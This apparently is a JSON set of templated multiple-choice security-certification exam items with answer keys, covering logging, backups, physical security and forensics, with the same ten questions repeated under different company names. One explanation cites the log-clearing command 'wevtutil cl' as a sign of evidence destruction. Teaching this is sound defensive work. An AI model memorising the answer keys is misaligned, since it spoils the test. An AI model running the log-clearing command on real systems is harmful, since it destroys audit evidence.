        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-731",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 7 天",
      "B. 只要硬碟有空間才保存，無強制期限",
      "C. 至少保存 30 天",
      "D. 至少保存 180 天（約半年）以上"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-732",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "B. 系統成功重啟",
      "C. 防毒軟體更新成功",
      "D. 建立了新的使用者帳號"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-733",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器",
      "B. 關閉所有日誌之時間標籤",
      "C. 允許每台伺服器手動由管理員隨意調整時間",
      "D. 每天由人工打卡確認"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-734",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 網域名稱查詢",
      "B. 單純 Ping 掃描",
      "C. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "D. 無憑證黑箱掃描"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-735",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 完全不做備份，僅靠防毒軟體",
      "B. 僅備份至本機 C 槽桌面",
      "C. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "D. 將備份檔透過匿名 FTP 上傳"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-736",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 需要過去一個月內的所有備份",
      "B. 僅需要週三的增量備份",
      "C. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "D. 僅需要週日的完整備份"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-737",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 一般木質喇叭鎖門",
      "B. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "C. 僅張貼「請勿尾隨」之警語告示牌",
      "D. 長期開啟大門保持通風"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-738",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 乾粉滅火器手動噴灑",
      "B. 泡沫滅火系統",
      "C. 傳統高壓水柱灑水系統",
      "D. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-739",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 撕除硬碟標籤即可",
      "B. 僅在 Windows 中執行「右鍵格式化」",
      "C. 直接丟入一般垃圾桶",
      "D. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-740",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "B. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "C. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "D. 將網路線拔除防止惡意連線向外傳輸"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-741",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 7 天",
      "B. 至少保存 180 天（約半年）以上",
      "C. 只要硬碟有空間才保存，無強制期限",
      "D. 至少保存 30 天"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-742",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 建立了新的使用者帳號",
      "B. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "C. 系統成功重啟",
      "D. 防毒軟體更新成功"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-743",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 允許每台伺服器手動由管理員隨意調整時間",
      "B. 關閉所有日誌之時間標籤",
      "C. 每天由人工打卡確認",
      "D. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-744",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "B. 無憑證黑箱掃描",
      "C. 網域名稱查詢",
      "D. 單純 Ping 掃描"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-745",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某區域教學醫學中心為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 完全不做備份，僅靠防毒軟體",
      "B. 將備份檔透過匿名 FTP 上傳",
      "C. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "D. 僅備份至本機 C 槽桌面"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-746",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某高科技晶圓代工大廠每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "B. 僅需要週三的增量備份",
      "C. 需要過去一個月內的所有備份",
      "D. 僅需要週日的完整備份"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-747",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）",
      "B. 僅張貼「請勿尾隨」之警語告示牌",
      "C. 長期開啟大門保持通風",
      "D. 一般木質喇叭鎖門"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-748",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 傳統高壓水柱灑水系統",
      "B. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "C. 乾粉滅火器手動噴灑",
      "D. 泡沫滅火系統"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-749",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某區域教學醫學中心批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 直接丟入一般垃圾桶",
      "B. 僅在 Windows 中執行「右鍵格式化」",
      "C. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "D. 撕除硬碟標籤即可"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-750",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "B. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "C. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "D. 將網路線拔除防止惡意連線向外傳輸"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-751",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台接受主管機關資安稽核，查核委員要求檢視核心伺服器過去半年的系統存取日誌。依據我國《資通安全管理法》相關辦法之法規要求，公務與關鍵機關之各項資通安全稽核軌跡日誌，法定最低保存期限為多久？",
    "options": [
      "A. 至少保存 180 天（約半年）以上",
      "B. 只要硬碟有空間才保存，無強制期限",
      "C. 至少保存 7 天",
      "D. 至少保存 30 天"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-752",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台監控人員在審查 Windows 網域伺服器日誌時，發現出現了一筆 Event ID 為 `1102` 的稽核事件。此事件在 Windows 安全日誌中代表何種含意？",
    "options": [
      "A. 防毒軟體更新成功",
      "B. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "C. 系統成功重啟",
      "D. 建立了新的使用者帳號"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-753",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學內部多台伺服器未設定 NTP 校時，導致事件發生時各設備日誌時間偏差高達數十分鐘至數小時，鑑識人員完全無法依時序關聯還原黑客入侵路徑。為根治此問題，IT 團隊應採取何種配置？",
    "options": [
      "A. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器",
      "B. 允許每台伺服器手動由管理員隨意調整時間",
      "C. 每天由人工打卡確認",
      "D. 關閉所有日誌之時間標籤"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-754",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安團隊使用漏洞掃描工具進行內部資產盤點，若欲深入掌握每台伺服器內部已安裝套件的具體版本、缺少之 Windows 補丁以及內部註冊表不當組態，應採用何種掃描方式？",
    "options": [
      "A. 無憑證黑箱掃描",
      "B. 單純 Ping 掃描",
      "C. 認證弱點掃描（Credentialed / Authenticated Scan）",
      "D. 網域名稱查詢"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-755",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為防止勒索軟體在加密本地端檔案後，順著網路連線將掛載的 NAS 備份檔一併全數銷毀，在備份架構上最應嚴格落實下列何項原則？",
    "options": [
      "A. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "B. 僅備份至本機 C 槽桌面",
      "C. 完全不做備份，僅靠防毒軟體",
      "D. 將備份檔透過匿名 FTP 上傳"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-756",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司每週日凌晨執行一次「完整備份（Full Backup）」，週一至週六每晚執行「增量備份（Incremental Backup）」。若該系統於週四下午不幸硬碟毀損，還原時需要依序載入哪些備份檔案？",
    "options": [
      "A. 僅需要週日的完整備份",
      "B. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "C. 僅需要週三的增量備份",
      "D. 需要過去一個月內的所有備份"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-757",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商核心資料中心機房為防止未經授權人員尾隨合法員工潛入（Tailgating / Piggybacking），在實體出入口設計上應優先採用何種門禁管制設施？",
    "options": [
      "A. 長期開啟大門保持通風",
      "B. 一般木質喇叭鎖門",
      "C. 僅張貼「請勿尾隨」之警語告示牌",
      "D. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-758",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某公務機關資訊處新建置之主要伺服器機房，為防止火災發生時水柱灑水破壞高單價之伺服器主機與儲存設備，機房自動滅火系統應選用何種類型？",
    "options": [
      "A. 乾粉滅火器手動噴灑",
      "B. 傳統高壓水柱灑水系統",
      "C. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "D. 泡沫滅火系統"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-759",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某知名大型網路電商平台批次淘汰一批儲存過大量客戶機敏身分證影本的老舊 SAS 硬碟，依據 NIST SP 800-88 媒體消磁與銷毀標準，若欲達到「不可復原（Purge）」之最高防護水準，應採取何種處理方式？",
    "options": [
      "A. 直接丟入一般垃圾桶",
      "B. 僅在 Windows 中執行「右鍵格式化」",
      "C. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎",
      "D. 撕除硬碟標籤即可"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-760",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安小組發現某台線上交易伺服器正連線至不明惡意 IP 且記憶體中有異常進程運作，小組成員正準備進行數位證據採集。下列何項操作會嚴重破壞數位證據之完整性，應絕對嚴格禁止？",
    "options": [
      "A. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "B. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "C. 將網路線拔除防止惡意連線向外傳輸",
      "D. 使用防寫裝置（Write Blocker）採集硬碟映像"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
